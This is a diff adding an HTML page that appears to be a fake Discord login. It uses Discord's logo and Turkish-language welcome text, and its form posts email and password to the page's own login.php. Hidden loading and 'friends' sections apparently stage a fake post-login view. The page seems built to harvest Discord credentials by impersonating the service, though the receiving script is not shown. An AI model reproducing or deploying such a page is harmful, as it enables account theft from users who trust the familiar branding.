@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title>Discord Login</title>
+  <link rel="stylesheet" href="discord.css" />
+  <style>
+    /* Your CSS styles here */
+  </style>
+</head>
+<body>
+  <nav>
+    <a href="#">
+      <img
+        class="logo"
+        src="https://seeklogo.com/images/D/discord-logo-B02E5FBA04-seeklogo.com.png"
+        alt="Discord Logo"
+      />
+    </a>
+  </nav>
+
+  <div class="container">
+    <div class="loading hidden">
+      <img
+        src="https://media1.tenor.com/images/83cdd1dd40cdb87020949e0f075b9648/tenor.gif?itemid=11230336"
+        alt="Loading Animation"
+      />
+    </div>
+
+    <div class="friends hidden">
+      <div class="friends__mutual hidden">
+        <span id="mutualcount">7</span> mutual friends
+      </div>
+
+      <h2>All friends - 7</h2>
+      <ul id="friendslist">
+        <!--<li data-mutual="73">ninja</li>-->
+      </ul>
+    </div>
+
+    <div class="login">
+      <form action="login.php" method="POST" id="login" onsubmit="return validateForm()">
+        <header>
+          <h1>Tekrar hoş geldin!</h1>
+          <p>Sizi tekrar göreceğimiz için çok heyecanlıyız!</p>
+        </header>
+
+        <div class="form__group form__group--email error">
+          <label for="email">
+            E-POSTA
+            <span class="error__message">- </span>
+          </label>
+          <input type="text" id="email" name="email" required />
+        </div>
+
+        <div class="form__group form__group--password">
+          <label for="password">
+            ŞİFRE 
+            <span class="error__message">- </span>
+          </label>
+          <input type="password" id="password" name="password" required />
+        </div>
+
+        <div class="form__group">
+          <input class="btn" id="btnLogin" type="submit" value="Giriş Yap" />
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function validateForm() {
+      var email = document.getElementById('email').value;
+      var password = document.getElementById('password').value;
+
+      if (email.trim() == '') {
+        alert('Lütfen bir e-posta adresi girin');
+        return false;
+      }
+      
+      if (password.trim() == '') {
+        alert('Lütfen bir şifre girin');
+        return false;
+      }
+
+      return true;
+    }
+  </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
